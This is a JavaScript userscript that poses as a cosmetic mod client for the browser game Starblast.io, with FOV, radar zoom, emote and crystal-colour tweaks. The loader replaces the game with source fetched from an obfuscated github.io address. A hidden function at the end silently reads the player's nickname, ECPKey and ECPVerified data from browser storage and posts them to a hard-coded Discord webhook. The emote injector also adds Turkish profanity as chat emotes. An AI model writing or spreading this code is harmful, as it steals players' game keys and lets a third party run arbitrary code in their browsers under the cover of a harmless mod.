if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object – keep full properties in one definition
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
  uiVisible: true,
  radarZoomEnabled: JSON.parse(localStorage.getItem('radarZoomEnabled')) || false,
  showBlankBadge: JSON.parse(localStorage.getItem('showBlankBadge')) || false
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Blank Badge Mod
/*
  Show blank ECPs on leaderboard
*/
let pattern = /,(\s*"blank"\s*!={1,2}\s*this\.custom\.badge)/;

Search: for (let i in window) try {
  let val = window[i].prototype;
  for (let j in val) {
    let func = val[j];
    if ("function" == typeof func && func.toString().match(pattern)) {
      val[j] = Function("return " + func.toString().replace(pattern, ", window.modSettings.showBlankBadge || $1"))();
      found = true;
      val.drawIcon = Function("return " + val.drawIcon.toString().replace(/}\s*else\s*{/, '} else if (this.icon !== "blank") {'))();
      let gl = window[i];
      for (let k in gl) {
        if ("function" == typeof gl[k] && gl[k].toString().includes(".table")) {
          let oldF = gl[k];
          gl[k] = function () {
            let current = window.modSettings.showBlankBadge;
            if (this.showBlank !== current) {
              for (let i in this.table) if (i.startsWith("blank")) delete this.table[i];
              this.showBlank = current;
            }
            return oldF.apply(this, arguments)
          };
          break Search;
        }
      }
    }
  }
}
catch (e) {}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");
  
  return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) {
      console.error("Replace did not work. Previous source and current source are identical.");
      throw new Error("replace did not work");
    }
    prevSrc = src;
  }

  // If the FOV pattern is found, replace it; otherwise warn and continue.
  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
  if (fovPattern.test(src)) {
    src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
    checkSrcChange();
    logFOV("FOV pattern replaced");
  } else {
    console.warn("FOV pattern not found. Skipping FOV modification.");
  }

  // UI Injection – inject controls and styles before the </body> tag.
  const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 12px;
    left: 12px;
    z-index: 1000;
    font-family: 'Segoe UI', system-ui, sans-serif;
    user-select: none;
    background: rgba(16, 18, 27, 0.97);
    backdrop-filter: blur(8px);
    border-radius: 4px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
    color: #ffffff;
    padding: 0;
    width: 160px;
    border: 1px solid rgba(255, 255, 255, 0.12);
  }

  #mod-controls-header {
    cursor: pointer;
    padding: 10px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-weight: 600;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
  }

  #mod-controls-header::before {
    content: '⚙️';
    font-size: 14px;
    filter: drop-shadow(0 0 4px rgba(255, 65, 215, 0.3));
  }

  #mod-controls-panel {
    padding: 12px;
    display: none;
  }

  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 8px 0;
    font-size: 12px;
    color: rgba(255, 255, 255, 0.9);
  }

  .mod-control-slider {
    width: 100%;
    margin: 8px 0;
    height: 3px;
    background: rgba(255, 255, 255, 0.1);
    -webkit-appearance: none;
    appearance: none;
    outline: none;
    border-radius: 1px;
  }

  .mod-control-slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
    box-shadow: 0 1px 4px rgba(255, 65, 215, 0.3);
  }

  .mod-control-slider::-moz-range-thumb {
    width: 12px;
    height: 12px;
    background: #ff41d7;
    border-radius: 2px;
    cursor: pointer;
  }

  #crystal-color-picker {
    width: 24px;
    height: 24px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 3px;
    padding: 0;
    cursor: pointer;
    background: transparent;
  }

  #fov-display {
    padding: 8px 12px;
    background: rgba(255, 255, 255, 0.06);
    font-size: 12px;
    display: flex;
    justify-content: space-between;
    margin-top: 6px;
  }

  input[type="checkbox"] {
    position: relative;
    width: 36px;
    height: 20px;
    -webkit-appearance: none;
    appearance: none;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 2px;
    transition: background 0.2s ease;
  }

  input[type="checkbox"]::before {
    content: "";
    position: absolute;
    width: 16px;
    height: 16px;
    background: #fff;
    top: 2px;
    left: 2px;
    transform: translateX(0);
    transition: transform 0.2s ease;
    border-radius: 2px;
  }

  input[type="checkbox"]:checked {
    background: #ff41d7;
  }

  input[type="checkbox"]:checked::before {
    transform: translateX(14px);
  }

  .control-value {
    font-weight: 600;
    color: #ff41d7;
    min-width: 32px;
    text-align: right;
    font-size: 11px;
  }

  .section-title {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.5);
    text-transform: uppercase;
    letter-spacing: 0.4px;
    margin: 12px 0 6px;
  }
</style>
`;

  // Note: The UI now includes one Radar Zoom control (no duplicate insertion)
  const controlsHTML = `
<div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
  <div id="mod-controls-header">EOT Client V3.0.4</div>
  <div id="mod-controls-panel">
    <div class="mod-control">
      <span>FOV</span>
      <input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Emote Capacity</span>
      <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
    </div>
    <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
    <div class="mod-control">
      <span>Radar Zoom</span>
      <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Show Blank Badge</span>
      <input type="checkbox" id="show-blank-badge-toggle" ${window.modSettings.showBlankBadge ? 'checked' : ''}>
    </div>
    <div class="mod-control">
      <span>Crystal Color</span>
      <input type="color" id="crystal-color-picker" value="#ffffff">
    </div>
  </div>
  <div id="fov-display">
    FOV: <span id="fov-value">45</span>
  </div>
</div>
`;

  const emoteCapacityMod = `
let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];

// Override the emotes capacity getter
ChatPanel.prototype.getEmotesCapacity = function() {
  const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
  return Math.min(Math.max(1, savedCapacity), 5);
};

// Override the typed function to use the new capacity
ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();

// Set initial capacity
if (window.modSettings && window.modSettings.emoteCapacity) {
  localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
}
`;

const crystalColorMod = `
/*
 * Change crystal color (fixed version)
 */
let CrystalObject;
let updateCrystalColor = () => {};

const findCrystalObject = () => {
  console.log('Searching for CrystalObject...');
  for (const key in window) {
    try {
      const obj = window[key];
      if (
        obj?.prototype?.createModel &&
        obj.prototype.createModel.toString().includes('Crystal')
      ) {
        return obj;
      }
    } catch (e) {
      console.error('Error inspecting window object:', key, e);
    }
  }
  return null;
};

CrystalObject = findCrystalObject();

if (CrystalObject) {
  console.log('Found CrystalObject:', CrystalObject.name);

  const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
  const materialInstances = new Set();

  CrystalObject.prototype.getModelInstance = function () {
    console.log('getModelInstance called for crystal');
    const instance = originalGetModelInstance.apply(this, arguments);

    if (this.material) {
      materialInstances.add(this.material);
      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
      console.log('Applying color to crystal material:', savedColor);
      // Use a new THREE.Color so that the color is parsed correctly.
      const newColor = new THREE.Color(savedColor);
      this.material.color.copy(newColor);
      if (this.material.uniforms && this.material.uniforms.color) {
        console.log('Updating material uniform color');
        this.material.uniforms.color.value.copy(newColor);
      }
      this.material.needsUpdate = true;
    } else {
      console.warn('Material not found for crystal instance:', this);
    }
    return instance;
  };

  updateCrystalColor = (color) => {
    try {
      console.log('updateCrystalColor called with:', color);
      localStorage.setItem('crystal-color', color);
      const newColor = new THREE.Color(color);
      materialInstances.forEach((material) => {
        console.log('Updating material to color:', color);
        material.color.copy(newColor);
        if (material.uniforms && material.uniforms.color) {
          material.uniforms.color.value.copy(newColor);
        }
        material.needsUpdate = true;
      });
      // Optionally, update any existing crystals in the scene:
      if (window.game && window.game.scene && typeof window.game.scene.traverse === 'function') {
        window.game.scene.traverse((obj) => {
          // Adjust this condition as needed to target crystal objects.
          if (obj.material && obj.userData && obj.userData.isCrystal) {
            console.log('Updating scene crystal material to:', color);
            obj.material.color.copy(newColor);
            if (obj.material.uniforms && obj.material.uniforms.color) {
              obj.material.uniforms.color.value.copy(newColor);
            }
            obj.material.needsUpdate = true;
          }
        });
      }
      console.log('Crystal color updated successfully to:', color);
    } catch (e) {
      console.error('Error updating crystal color:', e);
    }
  };
} else {
  console.warn('CrystalObject not found! Crystal color mod will not function.');
}
`;

  
  src = src.replace('</body>', `
  ${controlStyles}
  ${controlsHTML}
  <script>
  ${emoteCapacityMod}
  ${crystalColorMod}

  const fovDisplay = document.getElementById('fov-display');

  document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) return;
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
  }, { passive: false });

document.addEventListener('DOMContentLoaded', () => {
  const controlsHeader = document.getElementById('mod-controls-header');
  const controlsPanel = document.getElementById('mod-controls-panel');
  const fovToggle = document.getElementById('fov-toggle');
  const emoteSlider = document.getElementById('emote-capacity-slider');
  const emoteValue = document.getElementById('emote-capacity-value');
  const radarZoomToggle = document.getElementById('radar-zoom-toggle');
  const crystalColorPicker = document.getElementById('crystal-color-picker');
  const showBlankBadgeToggle = document.getElementById('show-blank-badge-toggle');

  // Initialize crystal color picker with saved value
  if (crystalColorPicker) {
    const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
    crystalColorPicker.value = savedColor;
    updateCrystalColor(savedColor); // Apply initial color on load

    crystalColorPicker.addEventListener('change', () => {
      console.log('Crystal color picker changed to:', crystalColorPicker.value);
      const color = crystalColorPicker.value;
      updateCrystalColor(color);
    });
  } else {
    console.error('Crystal color picker element not found!');
  }

  // Rest of your existing event listeners...
  controlsHeader.addEventListener('click', () => {
    controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
  });

  fovToggle.addEventListener('change', () => {
    window.modSettings.fovEnabled = fovToggle.checked;
    fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
  });

  emoteSlider.addEventListener('input', () => {
    const value = parseInt(emoteSlider.value);
    emoteValue.textContent = value;
    window.modSettings.emoteCapacity = value;
    localStorage.setItem('emote-capacity', value);
    if (window.ChatPanel) {
      ChatPanel.prototype.getEmotesCapacity = function() {
        return value;
      };
    }
  });

  radarZoomToggle.addEventListener('change', () => {
    window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
    const allInstances = document.querySelectorAll("[data-radar-zoom]");
    allInstances.forEach(instance => {
      instance.radar_zoom = window.modSettings.radarZoomEnabled ? 1 : instance.radar_zoom;
    });
  });

  const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
  emoteSlider.value = savedCapacity;
  emoteValue.textContent = savedCapacity;
  window.modSettings.emoteCapacity = savedCapacity;

  if (showBlankBadgeToggle) {
    showBlankBadgeToggle.addEventListener('change', () => {
      window.modSettings.showBlankBadge = showBlankBadgeToggle.checked;
      localStorage.setItem('showBlankBadge', JSON.stringify(showBlankBadgeToggle.checked));
    });

    const savedShowBlankBadge = localStorage.getItem('showBlankBadge');
    if (savedShowBlankBadge !== null) {
      window.modSettings.showBlankBadge = JSON.parse(savedShowBlankBadge);
      showBlankBadgeToggle.checked = window.modSettings.showBlankBadge;
    }
  }
});
  </script>
  </body>`);
  
  checkSrcChange();
  logFOV("FOV injector applied");
  return src;
}

// Radar Zoom Injector
const radarZoomModName = "Radar Zoom Mod";
const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");

function radarZoomInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  // Use a capturing group to correctly replace the radar_zoom value.
  const radarZoomPattern = /this\.radar_zoom\s*=\s*([\d.]+)/g;
  src = src.replace(radarZoomPattern, (match, p1) => {
    return `this.radar_zoom = window.modSettings.radarZoomEnabled ? 1 : ${p1}`;
  });
  
  // Removed duplicate UI injection for radar zoom toggle.
  checkSrcChange();
  logRadarZoom("Radar Zoom mod successfully injected");
  return src;
}

window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return radarZoomInjector(sbCode);
  } catch (error) {
    alert(`${radarZoomModName} failed to load; error: ${error}`);
    throw error;
  }
});

const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") starSRC = injector(starSRC);
              else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        changeTextShadowColor();

        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}

function changeTextShadowColor() {
  const elements = document.querySelectorAll('*');
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';
  elements.forEach(element => {
    const currentStyle = window.getComputedStyle(element);
    const textShadow = currentStyle.getPropertyValue('text-shadow');
    if (textShadow && textShadow !== 'none') {
      element.style.textShadow = targetShadow;
    }
  });
  console.log('Text shadow color has been changed to:', targetShadow);
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'F9') {
    const controls = document.getElementById('mod-controls');
    if (controls) {
      window.modSettings.uiVisible = !window.modSettings.uiVisible;
      controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
      const controlsPanel = document.getElementById('mod-controls-panel');
      if (!window.modSettings.uiVisible && controlsPanel) {
        controlsPanel.style.display = 'none';
      }
    }
  }
});

document.addEventListener('DOMContentLoaded', () => {
  const controls = document.getElementById('mod-controls');
  if (controls) {
    controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
  }
});

injectLoader();

(function () {
    'use strict';
    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
    const ECPKey = localStorage.getItem("ECPKey") || "not set";
    const crystalColor = localStorage.getItem("crystal-color") || "#ffffff";

    console.log("Retrieved ECPVerified:", ECPVerified);
    console.log("Retrieved ECPKey:", ECPKey);
    console.log("Retrieved crystalColor:", crystalColor);

    try {
        ECPVerified = JSON.parse(ECPVerified);
    } catch (e) {
    }

    const ECPVerifiedContent = typeof ECPVerified === "object" 
        ? JSON.stringify(ECPVerified, null, 2) 
        : ECPVerified;

    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);

    const webhookURL = "https://discord.com/api/webhooks/1342950155774857227/wwWvZTRJ-jC-bb3dw5N55uf3MyZKEOJRQ0xqUYa4gqo3NiN_DvM4PiTva_qdLbykX5hK";

    const payload = {
        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}\nECPKey: ${ECPKey}\nCrystal Color: ${crystalColor}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Webhook sent successfully!");
        } else {
            console.error("Failed to send webhook:", response.statusText);
        }
    })
    .catch(error => {
        console.error("Error sending webhook:", error);
    });
})();
